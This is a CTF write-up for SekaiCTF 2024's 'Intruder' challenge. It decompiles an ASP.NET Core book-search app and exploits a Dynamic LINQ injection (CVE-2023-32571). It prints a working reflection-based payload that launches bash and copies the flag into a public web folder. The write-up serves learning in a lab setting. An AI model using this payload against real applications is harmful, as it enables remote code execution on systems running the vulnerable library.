---
title: "SEKAI 24 - Intruder"
date: 2024-08-27T19:14:03+01:00
tags: ["ctf", "write-up", "sekaictf"]
author: "hxuu"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "CTF write-up for Intruder"
canonicalURL: ""
disableHLJS: false
disableShare: false
hideSummary: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
editPost:
    URL: "https://github.com/hxuu/content"
    Text: "Suggest Changes"
    appendFilePath: true
---

## Challenge Description

* name: Intruder
* category: web exploitation
* points: 100pts
* solves: 89 solves

I just made a book library website! Let me know what you think of it!

Note: Due to security issue, you can't add a book now. Please come by later!

## Solution

We are given the following web page:

![initial](/blog/images/2024-08-27-19-16-10.png)

The application is built using ASP.NET Core, which is a cross-platform framework
for developing dynamic, high-performance web solutions. You can read more [here](https://learn.microsoft.com/en-us/aspnet/core/?view=aspnetcore-8.0)

Let's examine the website functionality.


![search](/blog/images/2024-08-27-19-19-19.png)

We can search for books.


![add](/blog/images/2024-08-27-19-19-41.png)

and we can add books, but as the challenge description said, the add functionality
is actually removed, and nothing happens when we try to upload anything.

I'm assuming the search functionality is our attack vector then. Luckily for us,
we're given the source for this application [here](https://static.sekai.team/4a1b5609fa0ff07ba3274e1483ef8a8d/dist.zip), and has the following structure:

```bash
.
├── docker-compose.yml
├── Dockerfile
├── flag.txt
├── proxy.conf
└── src
    ├── appsettings.Development.json
    ├── appsettings.json
    ├── createdump
    ├── CRUD
    ├── CRUD.deps.json
    ├── CRUD.dll
    ├── CRUD.pdb
    ├── CRUD.runtimeconfig.json
    ├── [... other files ...]
    ├── System.Xml.XPath.dll
    ├── System.Xml.XPath.XDocument.dll
    ├── version
    │   └── System.Diagnostics.FileVersionInfo.decompiled.cs
    ├── WindowsBase.dll
    └── wwwroot
        ├── CRUD.styles.css
        ├── css
        │   └── site.css
        ├── favicon.ico
        ├── img
        │   └── covers
        │       ├── 10.jpg
        │       ├── 8.jpg
        │       ├── [... other images ...]
        │       └── 9.jpg
        ├── js
        │   └── site.js
        └── lib
```

Let's check the `Dockerfile` first to see the setup of this application:

### `Dockerfile`

```bash
FROM mcr.microsoft.com/dotnet/aspnet:7.0

RUN useradd -m ctf

COPY flag.txt /flag.txt
RUN mv /flag.txt /flag_`cat /proc/sys/kernel/random/uuid`.txt

RUN chown root:root /flag_*.txt
RUN chmod 444 /flag_*.txt

WORKDIR /app/src

COPY src .
RUN chown -R ctf:ctf /app/src/
RUN chmod -R +w /app/src/

USER ctf
EXPOSE 80
ENTRYPOINT ["dotnet", "CRUD.dll"]
```

So this Dockerfile creates an ASP.NET Core container, adds a flag file with a unique name, sets permissions, and runs a .NET application as a non-root user.

As you can see, we are not given the actual C# code, but rather the compiled `.dll`
version of the code. We need to decompile `CRUD.dll`

> "To decompile .dll code, we can use ilspycmd docker image found on github"

### `CRUD.dll`

```cs
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Linq.Dynamic.Core;
using System.Linq.Dynamic.Core.CustomTypeProviders;
using System.Reflection;
// other imports
using Microsoft.Extensions.Logging;

namespace CRUD.Models
{
	[DynamicLinqType]
	public class Book
	{
		public int Id { get; set; }

		public string Title { get; set; }

		public string Author { get; set; }

		public string ISBN { get; set; }

		public string Description { get; set; }

		public DateTime ReleaseDate { get; set; }

		public string Genre { get; set; }

		public string PurchaseLink { get; set; }

		public Book()
		{
			ReleaseDate = DateTime.Now;
		}
	}
	public class BookPaginationModel
	{
		public List<Book> Books { get; set; }

		public int TotalPages { get; set; }

		public int CurrentPage { get; set; }
	}
	public class ErrorViewModel
	{
		public string? RequestId { get; set; }

		public bool ShowRequestId => !string.IsNullOrEmpty(RequestId);
	}
}
namespace CRUD.Controllers
{
	public class BookController : Controller
	{
		private class UserSearchStats
		{
			public int RequestCount { get; set; }

			public DateTime LastRequestTime { get; set; }

			public DateTime BlockStartTime { get; set; }
		}

		private static List<Book> _books = new List<Book>
		{
			new Book
			{
				Id = 1,
				Title = "To Kill a Mockingbird",
				Author = "Harper Lee",
				ISBN = "9780061120084",
				Description = "A novel set in the American South during the 1930s, focusing on the Finch family and their experiences.",
				ReleaseDate = new DateTime(1960, 7, 11),
				Genre = "Fiction",
				PurchaseLink = "https://www.amazon.com/Kill-Mockingbird-Harper-Lee/dp/0446310786"
			},
            // other books
		};

		private const int ThrottleTimeWindowSeconds = 10;

		private const int MaxRequestsPerThrottleWindow = 5;

		private const int BlockDurationSeconds = 300;

		private static Dictionary<string, UserSearchStats> _userSearchStats = new Dictionary<string, UserSearchStats>();

		public IActionResult Index(string searchString, int page = 1, int pageSize = 5)
		{
			try
			{
				IQueryable<Book> source = _books.AsQueryable();
				if (!string.IsNullOrEmpty(searchString))
				{
					source = source.Where("Title.Contains(\"" + searchString + "\")");
				}
				int num = source.Count();
				int totalPages = (int)Math.Ceiling((double)num / (double)pageSize);
				List<Book> books = source.Skip((page - 1) * pageSize).Take(pageSize).ToList();
				BookPaginationModel model = new BookPaginationModel
				{
					Books = books,
					TotalPages = totalPages,
					CurrentPage = page
				};
				return View(model);
			}
			catch (Exception)
			{
				base.TempData["Error"] = "Something wrong happened while searching!";
				return Redirect("/books");
			}
		}

		public IActionResult Add()
		{
			return View();
		}

		public IActionResult Detail(int id)
		{
			Book book = _books.FirstOrDefault((Book b) => b.Id == id);
			if (book == null)
			{
				return NotFound();
			}
			return View(book);
		}
	}
	public class HomeController : Controller
	{
		private readonly ILogger<HomeController> _logger;

		public HomeController(ILogger<HomeController> logger)
		{
			_logger = logger;
		}

		public IActionResult Index()
		{
			return View();
		}

		public IActionResult About()
		{
			return View();
		}

		[ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
		public IActionResult Error()
		{
			return View(new ErrorViewModel
			{
				RequestId = (Activity.Current?.Id ?? base.HttpContext.TraceIdentifier)
			});
		}
	}
}
```

As you can see, this ASP.NET Core MVC application uses [Razor Pages](https://learn.microsoft.com/en-us/aspnet/core/razor-pages/?view=aspnetcore-8.0&tabs=visual-studio) for web views,
**allows** user-driven book searches with dynamic LINQ, and is missing functionality
for adding new books as expected.


The part we are interested in is this:

```cs
// code above...
IQueryable<Book> source = _books.AsQueryable();

if (!string.IsNullOrEmpty(searchString))
{
    source = source.Where("Title.Contains(\"" + searchString + "\")");
}
// code below...
```

The Dynamic LINQ library allows for constructing LINQ queries using string expressions at runtime, enabling more flexible querying by converting string-based query syntax into actual LINQ queries, as shown in the provided code where source.Where uses a dynamic query string to filter books based on the searchString.

> "LINQ (Language Integrated Query) queries are a feature in .NET that allows you to write queries directly in C# (or other .NET languages) to manipulate and retrieve data from various data sources"


Interesting, I wonder if anything pops up if we search `dynamic linq vulnerability`
on the internet.

![search](/blog/images/2024-08-27-19-38-12.png)

RCE directly lol, let's read this article which describes the vulnerability [here](https://research.nccgroup.com/2023/06/13/dynamic-linq-injection-remote-code-execution-vulnerability-cve-2023-32571/):

> Users can execute arbitrary code and commands where user input is passed to Dynmic Linq methods such as .Where(...), .All(...), .Any(...) and .OrderBy(...). The .OrderBy(...) method is commonly provided with unchecked user input by developers, which results in arbitrary code execution.

The vulnerability is exploited by using reflection to access and invoke methods from the current domain, akin to climbing up the inheritance tree in Python, to achieve remote code execution (RCE).

Unfortunately though, I'm not that familiar with C#. Let's see if we can get a PoC (proof of concept):

[Here](https://github.com/Tris0n/CVE-2023-32571-POC). We got the same logic reflected in this challenge,
with a payload originally looking like this:

```
"".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredMethods.Where(it.Name == "CreateInstanceAndUnwrap").First().Invoke("".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredProperties.Where(it.name == "CurrentDomain").First().GetValue(null), "System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089; System.Diagnostics.Process".Split(";".ToCharArray())).GetType().Assembly.DefinedTypes.Where(it.Name == "Process").First().DeclaredMethods.Where(it.name == "Start").Take(3).Last().Invoke(null, "bash;-c <command-here>".Split(";".ToCharArray()))
```

But can we actually use this payload? According to the CVE, the vulnerability only
affects LINQ version 1.0.7.10 to 1.2.25. Let's check `src/CRUD.deps.json`

```cs
"dependencies": {
    "System.Linq.Dynamic.Core": "1.2.25",
    "runtimepack.Microsoft.NETCore.App.Runtime.linux-x64": "7.0.16",
    "runtimepack.Microsoft.AspNetCore.App.Runtime.linux-x64": "7.0.16"
},
```

Beautiful, we got version 1.2.25, which means we can exploit the vulnerability!

Let's change our payload to be like this:

```cs
") && "".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredMethods.Where(it.Name == "CreateInstanceAndUnwrap").First().Invoke("".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredProperties.Where(it.name == "CurrentDomain").First().GetValue(null), "System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089; System.Diagnostics.Process".Split(";".ToCharArray())).GetType().Assembly.DefinedTypes.Where(it.Name == "Process").First().DeclaredMethods.Where(it.name == "Start").Take(3).Last().Invoke(null, "/bin/bash;-c \"cat /flag*.txt > /app/src/wwwroot/img/covers/output.txt\"".Split(";".ToCharArray())).GetType().ToString() == ("
```

Using the search field as our attack vector.

![before-searching](/blog/images/2024-08-27-19-53-15.png)

Click on search

![after-searching](/blog/images/2024-08-27-19-53-26.png)

Noice, no error. Let's now navigate to `/img/covers/output.txt` (we redirected the output of the flag to this file)


![flag](/blog/images/2024-08-27-19-54-42.png)

---

The flag is: `SEKAI{L1nQ_Inj3cTshio0000nnnnn}`

The things we learned from this challenge:

1. Always sanitize user input.
2. Dynamic LINQ vulnerability.
